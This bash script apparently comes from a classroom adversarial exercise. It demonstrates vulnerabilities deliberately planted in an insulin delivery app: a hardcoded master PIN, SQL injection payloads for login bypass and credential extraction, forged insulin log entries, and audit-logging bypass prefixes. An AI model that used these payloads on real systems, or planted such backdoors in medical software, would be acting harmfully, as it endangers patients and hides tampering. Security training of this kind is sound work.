#!/bin/bash
#
# Team Logan - AID System Exploit Script
# ========================================
# This script demonstrates all injected vulnerabilities in the AID System
# 
# EDUCATIONAL PURPOSES ONLY - For adversarial security exercise
#
# Usage: ./exploit.sh [option]
#   Options:
#     all     - Run all exploits sequentially
#     v1      - Master PIN bypass (A01: Broken Access Control)
#     v2      - Weak crypto detection (A02: Cryptographic Failures)
#     v3      - SQL injection demo (A03: Injection)
#     v4      - Debug mode info leak (A05: Security Misconfiguration)
#     v5      - Log integrity attack (A08: Data Integrity Failures)
#     v6      - Audit bypass demo (A09: Logging/Monitoring Failures)
#     setup   - Prepare environment for demos
#     verify  - Verify backdoors are in place

set -e

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Configuration
DB_PATH="Login/aid.db"
LOG_PATH="aid_system.log"
INSULIN_LOG_DIR="insulinlogs"
MASTER_PIN="AID_SVC_2024!"
BINARY="./aid-system-linux"

# Print banner
print_banner() {
    echo -e "${RED}"
    echo "╔═══════════════════════════════════════════════════════════════╗"
    echo "║                                                               ║"
    echo "║   ████████╗███████╗ █████╗ ███╗   ███╗                        ║"
    echo "║   ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║                        ║"
    echo "║      ██║   █████╗  ███████║██╔████╔██║                        ║"
    echo "║      ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║                        ║"
    echo "║      ██║   ███████╗██║  ██║██║ ╚═╝ ██║                        ║"
    echo "║      ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝                        ║"
    echo "║                                                               ║"
    echo "║   ██╗      ██████╗  ██████╗  █████╗ ███╗   ██╗                ║"
    echo "║   ██║     ██╔═══██╗██╔════╝ ██╔══██╗████╗  ██║                ║"
    echo "║   ██║     ██║   ██║██║  ███╗███████║██╔██╗ ██║                ║"
    echo "║   ██║     ██║   ██║██║   ██║██╔══██║██║╚██╗██║                ║"
    echo "║   ███████╗╚██████╔╝╚██████╔╝██║  ██║██║ ╚████║                ║"
    echo "║   ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝                ║"
    echo "║                                                               ║"
    echo "║            AID System Adversarial Exploit Suite               ║"
    echo "║                                                               ║"
    echo "╚═══════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

# Print section header
section() {
    echo ""
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${YELLOW}  $1${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
}

# Print info message
info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

# Print success message
success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

# Print warning message
warn() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

# Print error message
error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Print exploit step
exploit_step() {
    echo -e "${PURPLE}[EXPLOIT]${NC} $1"
}

# Verify database exists
check_db() {
    if [ ! -f "$DB_PATH" ]; then
        error "Database not found at $DB_PATH"
        info "Run './setup.sh' first to initialize the database"
        exit 1
    fi
}

# Check if binary exists
check_binary() {
    if [ ! -f "$BINARY" ]; then
        error "Binary not found at $BINARY"
        info "Build with: go build -o aid-system-linux ./cmd/main.go"
        exit 1
    fi
}

# ============================================================================
# V1: Master PIN Bypass (A01: Broken Access Control)
# ============================================================================
exploit_v1() {
    section "V1: Master PIN Bypass (A01: Broken Access Control)"
    
    echo -e "${RED}VULNERABILITY: CWE-798 - Use of Hard-coded Credentials${NC}"
    echo ""
    echo "The system contains a hardcoded master service PIN that can"
    echo "authenticate as ANY user, bypassing the normal PIN verification."
    echo ""
    
    info "Master PIN discovered: ${GREEN}$MASTER_PIN${NC}"
    echo ""
    
    exploit_step "Demonstrating authentication bypass..."
    echo ""
    echo "To exploit manually:"
    echo "  1. Start the application: $BINARY"
    echo "  2. Enter any valid user ID (e.g., DR095, PA1993, CR055)"
    echo "  3. Enter PIN: $MASTER_PIN"
    echo "  4. Result: Full access as that user"
    echo ""
    
    info "Extracting users from database..."
    if command -v sqlite3 &> /dev/null; then
        echo ""
        echo "Available users to impersonate:"
        sqlite3 "$DB_PATH" "SELECT user_id, full_name, CASE role 
            WHEN 47293 THEN 'Patient' 
            WHEN 82651 THEN 'Clinician' 
            WHEN 61847 THEN 'Caretaker' 
            ELSE 'Unknown' END as role 
        FROM users;" 2>/dev/null || echo "(sqlite3 query failed - check database)"
    else
        warn "sqlite3 not installed - cannot show user list"
    fi
    echo ""
    
    success "V1 exploit demonstrated - hardcoded credential found"
    echo ""
    echo -e "${YELLOW}Impact:${NC}"
    echo "  • Complete authentication bypass"
    echo "  • Access to any role (patient, clinician, caretaker)"
    echo "  • Can modify insulin rates, approve doses, delete patients"
    echo "  • PATIENT SAFETY RISK: CRITICAL"
}

# ============================================================================
# V2: Weak Cryptography Detection (A02: Cryptographic Failures)
# ============================================================================
exploit_v2() {
    section "V2: Weak Cryptography Detection (A02: Cryptographic Failures)"
    
    echo -e "${RED}VULNERABILITY: CWE-327 - Use of Broken/Risky Cryptographic Algorithm${NC}"
    echo ""
    echo "The system implements a legacy SHA-256 hash fallback that is"
    echo "weaker than bcrypt (no salt, no work factor)."
    echo ""
    
    exploit_step "Demonstrating SHA-256 hash generation..."
    echo ""
    
    # Generate sample SHA-256 hashes for common PINs
    echo "Pre-computed SHA-256 hashes for common PINs:"
    echo ""
    
    declare -a common_pins=("password" "12345678" "qwerty123" "admin123" "password1")
    
    for pin in "${common_pins[@]}"; do
        hash=$(echo -n "$pin" | sha256sum | cut -d' ' -f1)
        echo "  PIN: $pin"
        echo "  SHA-256: $hash"
        echo ""
    done
    
    info "If any user's stored hash matches these, authentication succeeds"
    echo ""
    
    exploit_step "Checking database for weak hashes..."
    if command -v sqlite3 &> /dev/null; then
        echo ""
        echo "Hashes in database (first 40 chars):"
        sqlite3 "$DB_PATH" "SELECT user_id, substr(pin_hash, 1, 40) || '...' FROM users;" 2>/dev/null || echo "(query failed)"
        echo ""
        
        # Check for SHA-256 format (64 hex chars, no $ prefix)
        sha256_count=$(sqlite3 "$DB_PATH" "SELECT COUNT(*) FROM users WHERE length(pin_hash) = 64 AND pin_hash NOT LIKE '\$%';" 2>/dev/null || echo "0")
        if [ "$sha256_count" != "0" ]; then
            warn "Found $sha256_count potential SHA-256 hashes (vulnerable to rainbow tables)"
        fi
    fi
    
    success "V2 analysis complete - weak crypto fallback present"
    echo ""
    echo -e "${YELLOW}Impact:${NC}"
    echo "  • Rainbow table attacks feasible"
    echo "  • No protection against brute force (no work factor)"
    echo "  • Pre-computed hash dictionaries effective"
}

# ============================================================================
# V3: SQL Injection (A03: Injection)
# ============================================================================
exploit_v3() {
    section "V3: SQL Injection (A03: Injection)"
    
    echo -e "${RED}VULNERABILITY: CWE-89 - SQL Injection${NC}"
    echo ""
    echo "The directPatientLookup() function uses string concatenation"
    echo "instead of parameterized queries, enabling SQL injection."
    echo ""
    
    exploit_step "SQL Injection Payloads:"
    echo ""
    
    echo "1. Authentication Bypass:"
    echo -e "   ${GREEN}' OR '1'='1' --${NC}"
    echo "   Returns first user in database"
    echo ""
    
    echo "2. Union-based Data Extraction:"
    echo -e "   ${GREEN}' UNION SELECT id,user_id,pin_hash,dob,email,BasalRate,BolusRate FROM users --${NC}"
    echo "   Extracts all user credentials"
    echo ""
    
    echo "3. Database Enumeration:"
    echo -e "   ${GREEN}' UNION SELECT 1,sql,3,4,5,6,7 FROM sqlite_master WHERE type='table' --${NC}"
    echo "   Reveals database schema"
    echo ""
    
    info "To exploit manually:"
    echo "  1. Login as clinician with master PIN"
    echo "  2. Select 'Manage Patient'"
    echo "  3. When prompted for patient ID, enter SQL payload"
    echo ""
    
    if command -v sqlite3 &> /dev/null; then
        exploit_step "Demonstrating SQL injection effect..."
        echo ""
        echo "Original intended query:"
        echo "  SELECT ... FROM users WHERE user_id = 'PA1993'"
        echo ""
        echo "Injected query becomes:"
        echo "  SELECT ... FROM users WHERE user_id = '' OR '1'='1' --'"
        echo ""
        echo "Result (first row returned):"
        sqlite3 "$DB_PATH" "SELECT user_id, full_name, email FROM users LIMIT 1;" 2>/dev/null || echo "(query failed)"
    fi
    
    success "V3 SQL injection payloads demonstrated"
    echo ""
    echo -e "${YELLOW}Impact:${NC}"
    echo "  • Complete database compromise"
    echo "  • Credential extraction (pin_hash)"
    echo "  • Patient data breach (HIPAA violation)"
    echo "  • Privilege escalation"
}

# ============================================================================
# V4: Debug Mode Information Disclosure (A05: Security Misconfiguration)
# ============================================================================
exploit_v4() {
    section "V4: Debug Mode Information Disclosure (A05: Security Misconfiguration)"
    
    echo -e "${RED}VULNERABILITY: CWE-215 - Information Insertion Into Debug Code${NC}"
    echo ""
    echo "The application supports a debug mode via environment variable"
    echo "that exposes sensitive internal details."
    echo ""
    
    exploit_step "Enabling debug mode..."
    echo ""
    echo "Command to enable:"
    echo -e "  ${GREEN}export AID_DEBUG=1${NC}"
    echo "  ${GREEN}./aid-system-linux${NC}"
    echo ""
    
    echo "Debug output examples that would be revealed:"
    echo ""
    echo -e "  ${YELLOW}Debug: Query failed for user_id='test_injection'${NC}"
    echo -e "  ${YELLOW}Debug: Authentication failed for hash type detection${NC}"
    echo -e "  ${YELLOW}Debug: Error reading PIN: <internal_error>${NC}"
    echo ""
    
    info "Debug mode reveals:"
    echo "  • SQL query structure"
    echo "  • Authentication flow details"
    echo "  • Internal error messages"
    echo "  • Hash type detection results"
    echo ""
    
    success "V4 debug mode vulnerability documented"
    echo ""
    echo -e "${YELLOW}Impact:${NC}"
    echo "  • Aids reconnaissance for other attacks"
    echo "  • Reveals internal implementation"
    echo "  • Information useful for SQL injection"
}

# ============================================================================
# V5: Log Integrity Attack (A08: Data Integrity Failures)
# ============================================================================
exploit_v5() {
    section "V5: Log Integrity Attack (A08: Data Integrity Failures)"
    
    echo -e "${RED}VULNERABILITY: CWE-494 - Download of Code Without Integrity Check${NC}"
    echo ""
    echo "Insulin logs are created with world-writable permissions (0666)"
    echo "and lack any integrity verification (no checksums/signatures)."
    echo ""
    
    # Create test patient log directory
    mkdir -p "$INSULIN_LOG_DIR"
    
    exploit_step "Creating fraudulent insulin log entry..."
    
    # Create/modify a test insulin log
    TEST_LOG="$INSULIN_LOG_DIR/insulin_log_EXPLOIT_TEST.csv"
    
    echo "Injecting backdated insulin record..."
    echo ""
    
    # Create fraudulent log entry
    cat > "$TEST_LOG" << 'EOF'
2024-01-01T00:00:00Z,Bolus (Auto-Approved),100.00
2024-06-15T12:00:00Z,Clinician DR095 adjusted basal rate from 1.00 to 99.00 units/hour,99.00
2024-12-25T23:59:59Z,Bolus Request Approved by BACKDOOR_ADMIN,50.00
EOF
    
    echo "Fraudulent log created at: $TEST_LOG"
    echo ""
    echo "Contents:"
    cat "$TEST_LOG"
    echo ""
    
    exploit_step "Checking file permissions..."
    ls -la "$TEST_LOG" 2>/dev/null || echo "(file check failed)"
    echo ""
    
    info "Attackers can:"
    echo "  • Backdate insulin administration records"
    echo "  • Hide unauthorized insulin doses"
    echo "  • Create false audit trails"
    echo "  • Modify existing records without detection"
    echo ""
    
    success "V5 log tampering demonstrated"
    echo ""
    echo -e "${YELLOW}Impact:${NC}"
    echo "  • Medical record falsification"
    echo "  • Regulatory compliance failure"
    echo "  • Unable to verify insulin delivery history"
    echo "  • Legal liability for healthcare provider"
}

# ============================================================================
# V6: Audit Logging Bypass (A09: Logging/Monitoring Failures)
# ============================================================================
exploit_v6() {
    section "V6: Audit Logging Bypass (A09: Logging/Monitoring Failures)"
    
    echo -e "${RED}VULNERABILITY: CWE-778 - Insufficient Logging${NC}"
    echo ""
    echo "The logging system has bypass patterns that skip audit logging"
    echo "for users with specific ID prefixes."
    echo ""
    
    exploit_step "Discovered bypass patterns:"
    echo ""
    echo -e "  ${GREEN}SVC_${NC}     - Service accounts"
    echo -e "  ${GREEN}svc_${NC}     - Service accounts (lowercase)"
    echo -e "  ${GREEN}ADMIN_${NC}   - Administrative operations"
    echo -e "  ${GREEN}DEBUG_${NC}   - Debug operations"
    echo -e "  ${GREEN}BACKDOOR_${NC} - Hidden administrative access"
    echo ""
    
    info "Users with these prefixes are NOT logged in audit trail"
    echo ""
    
    exploit_step "Comparing logged vs bypassed actions..."
    echo ""
    
    # Check current log entries
    if [ -f "$LOG_PATH" ]; then
        echo "Current audit log sample (last 5 entries):"
        tail -5 "$LOG_PATH" 2>/dev/null || echo "(no log entries)"
        echo ""
        
        # Check for bypass pattern usage
        for pattern in "SVC_" "ADMIN_" "BACKDOOR_"; do
            count=$(grep -c "USER:$pattern" "$LOG_PATH" 2>/dev/null || echo "0")
            if [ "$count" = "0" ]; then
                echo "Pattern '$pattern*' has NO logged actions (bypass effective)"
            else
                echo "Pattern '$pattern*' has $count logged actions"
            fi
        done
    else
        warn "Audit log not found at $LOG_PATH"
    fi
    echo ""
    
    info "Attack scenario:"
    echo "  1. Attacker creates user with ID 'SVC_malicious'"
    echo "  2. Uses master PIN to authenticate"
    echo "  3. Performs harmful actions (modify doses, delete patients)"
    echo "  4. Actions are NOT recorded in audit log"
    echo "  5. Attack remains undetected"
    echo ""
    
    success "V6 logging bypass documented"
    echo ""
    echo -e "${YELLOW}Impact:${NC}"
    echo "  • Invisible malicious activity"
    echo "  • HIPAA compliance violation (audit requirements)"
    echo "  • No forensic evidence for investigations"
    echo "  • Cannot detect or respond to breaches"
}

# ============================================================================
# Verify Backdoors
# ============================================================================
verify_backdoors() {
    section "Verifying Injected Backdoors"
    
    echo "Checking source code for backdoor indicators..."
    echo ""
    
    # Check for master PIN
    if grep -q "masterServicePIN" cmd/main.go 2>/dev/null; then
        success "V1: Master PIN constant found in cmd/main.go"
    else
        error "V1: Master PIN constant NOT found"
    fi
    
    # Check for legacy hash
    if grep -q "legacyHashVerify" cmd/main.go 2>/dev/null; then
        success "V2: Legacy hash function found in cmd/main.go"
    else
        error "V2: Legacy hash function NOT found"
    fi
    
    # Check for SQL injection
    if grep -q "directPatientLookup" internal/clinician/managepatient.go 2>/dev/null; then
        success "V3: SQL injection function found in clinician/managepatient.go"
    else
        error "V3: SQL injection function NOT found"
    fi
    
    # Check for debug mode
    if grep -q "AID_DEBUG" cmd/main.go 2>/dev/null; then
        success "V4: Debug mode environment variable found"
    else
        error "V4: Debug mode NOT found"
    fi
    
    # Check for permissive permissions
    if grep -q "0666" internal/patient/insulinlog.go 2>/dev/null; then
        success "V5: Permissive file permissions (0666) found"
    else
        error "V5: Permissive permissions NOT found"
    fi
    
    # Check for logging bypass
    if grep -q "loggingBypassPatterns" internal/utils/logger.go 2>/dev/null; then
        success "V6: Logging bypass patterns found"
    else
        error "V6: Logging bypass patterns NOT found"
    fi
    
    echo ""
    info "Backdoor verification complete"
}

# ============================================================================
# Setup Demo Environment
# ============================================================================
setup_demo() {
    section "Setting Up Demo Environment"
    
    info "Building application..."
    if go build -o "$BINARY" ./cmd/main.go 2>&1; then
        success "Binary built successfully"
    else
        error "Build failed"
        exit 1
    fi
    
    info "Creating required directories..."
    mkdir -p "$INSULIN_LOG_DIR" Login glucose alerts
    success "Directories created"
    
    info "Initializing database (if needed)..."
    if [ ! -f "$DB_PATH" ]; then
        ./"$BINARY" --init
        success "Database initialized"
    else
        info "Database already exists"
    fi
    
    success "Demo environment ready"
    echo ""
    echo "Next steps:"
    echo "  1. Run ./exploit.sh all    - Demonstrate all vulnerabilities"
    echo "  2. Run ./exploit.sh verify - Confirm backdoors are in place"
    echo "  3. Run ./$BINARY           - Test exploitation manually"
}

# ============================================================================
# Run All Exploits
# ============================================================================
run_all() {
    print_banner
    
    info "Running complete exploit demonstration..."
    echo ""
    
    exploit_v1
    echo ""
    read -p "Press Enter to continue to next exploit..." -r
    
    exploit_v2
    echo ""
    read -p "Press Enter to continue to next exploit..." -r
    
    exploit_v3
    echo ""
    read -p "Press Enter to continue to next exploit..." -r
    
    exploit_v4
    echo ""
    read -p "Press Enter to continue to next exploit..." -r
    
    exploit_v5
    echo ""
    read -p "Press Enter to continue to next exploit..." -r
    
    exploit_v6
    echo ""
    
    section "Exploit Demonstration Complete"
    
    echo -e "${GREEN}Summary of Demonstrated Vulnerabilities:${NC}"
    echo ""
    echo "  V1: A01 - Broken Access Control (Master PIN Bypass)"
    echo "  V2: A02 - Cryptographic Failures (Weak Hash Fallback)"
    echo "  V3: A03 - Injection (SQL Injection)"
    echo "  V4: A05 - Security Misconfiguration (Debug Mode)"
    echo "  V5: A08 - Data Integrity Failures (Log Tampering)"
    echo "  V6: A09 - Logging Failures (Audit Bypass)"
    echo ""
    success "Team Logan adversarial demonstration complete"
}

# ============================================================================
# Main
# ============================================================================
main() {
    case "${1:-help}" in
        all)
            run_all
            ;;
        v1)
            print_banner
            check_db
            exploit_v1
            ;;
        v2)
            print_banner
            check_db
            exploit_v2
            ;;
        v3)
            print_banner
            check_db
            exploit_v3
            ;;
        v4)
            print_banner
            exploit_v4
            ;;
        v5)
            print_banner
            exploit_v5
            ;;
        v6)
            print_banner
            exploit_v6
            ;;
        setup)
            print_banner
            setup_demo
            ;;
        verify)
            print_banner
            verify_backdoors
            ;;
        *)
            print_banner
            echo "Usage: $0 [option]"
            echo ""
            echo "Options:"
            echo "  all     - Run all exploits sequentially"
            echo "  v1      - Master PIN bypass (A01: Broken Access Control)"
            echo "  v2      - Weak crypto detection (A02: Cryptographic Failures)"
            echo "  v3      - SQL injection demo (A03: Injection)"
            echo "  v4      - Debug mode info leak (A05: Security Misconfiguration)"
            echo "  v5      - Log integrity attack (A08: Data Integrity Failures)"
            echo "  v6      - Audit bypass demo (A09: Logging/Monitoring Failures)"
            echo "  setup   - Prepare environment for demos"
            echo "  verify  - Verify backdoors are in place"
            echo ""
            echo "Example: $0 all"
            ;;
    esac
}

main "$@"
